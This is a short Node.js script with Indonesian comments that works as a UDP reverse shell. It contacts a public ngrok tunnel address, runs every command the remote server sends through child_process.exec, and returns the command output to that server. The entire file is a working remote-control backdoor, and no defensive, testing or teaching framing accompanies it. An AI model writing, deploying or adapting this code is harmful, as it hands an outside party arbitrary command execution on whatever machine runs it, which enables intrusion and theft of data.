const s = require('child_process');
const dgram = require('dgram');

// Membuat socket UDP
const client = dgram.createSocket('udp4');

// Mengirim pesan UDP
const serverPort = 16400;
const serverAddress ='0.tcp.ap.ngrok.io' //'127.0.0.1';

let i = 0;

client.send('connect',serverPort,serverAddress,(callback)=> console.log(callback))

client.on('message',(msg,info)=>{
    console.log('server sending command > ',msg.toString())

    try{
        s.exec(msg.toString(),(error,stdout,stderr)=>{
            if(error)  client.send("-",error.message,serverPort,serverAddress)
            if(stdout) client.send(stdout.trim().split('\n').map((e,i,a)=> "+ "+e).join('\n'),serverPort,serverAddress)
            if(stderr) client.send(": ",stderr,serverPort,serverAddress)
        })
    }catch(error){
        console.log('err')
        client.send("-",error,serverPort,serverAddress)

    }
    // client.send(msg,serverPort,serverAddress)
})



